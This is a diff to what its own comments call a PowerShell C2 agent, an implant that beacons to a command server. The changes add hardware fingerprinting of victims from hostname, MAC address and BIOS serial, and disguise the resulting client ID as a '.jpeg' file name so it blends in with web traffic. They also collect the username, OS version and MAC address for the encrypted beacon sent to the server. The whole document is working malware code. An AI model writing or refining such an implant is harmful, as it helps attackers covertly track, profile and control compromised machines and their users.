@@ -18,6 +18,44 @@ $global:clientId = $null
 
 {{PATH_ROTATION_CODE}}
 
+# Function to generate a stable hardware-based ID
+function Get-StableClientId {
+    # Collect hardware identifiers that are relatively stable
+    $computerName = [System.Net.Dns]::GetHostName()
+    
+    # Get MAC address of primary network adapter
+    $macAddress = try {
+        (Get-WmiObject Win32_NetworkAdapterConfiguration | 
+         Where-Object { $_.IPEnabled -eq $true } | 
+         Select-Object -First 1).MACAddress
+    } catch {
+        "Unknown-MAC"
+    }
+    
+    # Get BIOS information if available
+    $biosSerial = try {
+        (Get-WmiObject Win32_BIOS).SerialNumber
+    } catch {
+        "Unknown-BIOS"
+    }
+    
+    # Combine hardware identifiers
+    $hardwareString = "$computerName|$macAddress|$biosSerial"
+    
+    # Generate hash for the hardware string
+    $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes($hardwareString)
+    )
+    
+    # Take first 5 bytes of hash and convert to readable format
+    $randomPart = [BitConverter]::ToString($hashBytes[0..4]).Replace("-", "").ToUpper().Substring(0, 5)
+    
+    # Make the ID look like an image file to blend in with web traffic
+    $clientId = "$randomPart-img.jpeg"
+    
+    return $clientId
+}
+
 # Function to encrypt data for C2 communication
 function Encrypt-Data {
     param([string]$PlainText)
@@ -131,20 +169,28 @@ function Update-EncryptionKey {
 
 # Function to generate a new client ID using the specified format
 function New-ClientId {
-    # Generate a random 5-character string using uppercase letters
-    $random = -join ((65..90) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-    # Append "-img.jpeg" to make it look like an image file
-    $clientId = "$random-img.jpeg"
-    return $clientId
+    # Get hardware details
+    $computerName = [System.Net.Dns]::GetHostName()
+    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -First 1).MACAddress
+
+    # Create a unique hash from the hardware info
+    $hashInput = "$computerName|$macAddress"
+    $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hashInput))
+    
+    # Create ID in the format XXXXX-img.jpeg
+    $randomPart = [BitConverter]::ToString($hashBytes[0..2]).Replace("-", "").ToUpper().Substring(0, 5)
+    return "$randomPart-img.jpeg"
 }
 
-# Function to gather simplified system identification information
+# Function to gather system identification information
 function Get-SystemIdentification {
-    # Gather only hostname and IP
+    # Gather standard system information
     $systemInfo = @{
         Hostname = [System.Net.Dns]::GetHostName()
         IP = try {
-            (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
+            (Get-NetIPAddress -AddressFamily IPv4 | 
+             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
+             Select-Object -First 1).IPAddress
         } catch {
             "Unknown"
         }
@@ -156,14 +202,31 @@ function Get-SystemIdentification {
         $systemInfo.ClientId = $global:clientId
     } else {
         # Generate a new client ID
-        $global:clientId = New-ClientId
+        $global:clientId = Get-StableClientId
         $systemInfo.ClientId = $global:clientId
+        Write-Host "Generated new stable client ID: $global:clientId"
     }
+    
+    # Add hardware identifiers to help server correlate clients
+    $systemInfo.MacAddress = try {
+        (Get-WmiObject Win32_NetworkAdapterConfiguration | 
+         Where-Object { $_.IPEnabled -eq $true } | 
+         Select-Object -First 1).MACAddress
+    } catch {
+        "Unknown"
+    }
+    
+    # Add OS info for better identification
+    $systemInfo.OsVersion = [System.Environment]::OSVersion.VersionString
+    $systemInfo.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
     
     # Add rotation information if enabled
     if ($global:pathRotationEnabled) {
         $systemInfo.RotationId = $global:currentRotationId
     }
+
+    # Add this inside Get-SystemIdentification before returning the JSON
+    Write-Host "DEBUG: System info client ID: $($systemInfo.ClientId)"
     
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
@@ -414,7 +477,7 @@ function Process-ServerResponse {
     }
 }
 
-# Create a persistent storage for client ID
+# Create a persistent storage for client ID - modified to be more resilient
 function Save-ClientId {
     param([string]$ClientId)
     
@@ -443,6 +506,7 @@ function Save-ClientId {
     }
     catch {
         Write-Host "Warning: Unable to save client ID to persistent storage: $_"
+        # This is non-critical as we can regenerate the ID based on hardware
     }
 }
 
@@ -460,7 +524,9 @@ function Load-ClientId {
     catch {
         Write-Host "Warning: Unable to load client ID from persistent storage: $_"
     }
-    return $null
+    
+    # If we can't load from storage, generate a new stable ID
+    return Get-StableClientId
 }
 
 # Main agent loop
@@ -474,9 +540,16 @@ function Start-AgentLoop {
         $global:clientId = $loadedClientId
         Write-Host "Loaded client ID from persistent storage: $global:clientId"
     } else {
-        # Generate a new client ID
-        $global:clientId = New-ClientId
-        Write-Host "Generated new client ID: $global:clientId"
+        # Generate a stable hardware-based client ID
+        $global:clientId = Get-StableClientId
+        Write-Host "Generated stable client ID: $global:clientId"
+        
+        # Try to save it, but if saving fails, it's not critical since we can regenerate it
+        try {
+            Save-ClientId -ClientId $global:clientId
+        } catch {
+            Write-Host "Note: Unable to save client ID, but will continue using in-memory ID"
+        }
     }
     
     # Get system information for identification
@@ -524,6 +597,8 @@ function Start-AgentLoop {
             $systemInfoRaw = Get-SystemIdentification
             $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
             
+            # Add this before the beacon payload creation
+            Write-Host "DEBUG: Using client ID: $global:clientId"
             # Prepare the beacon payload - include client ID in plain text
             $beaconPayload = @{
                 client_id = $global:clientId
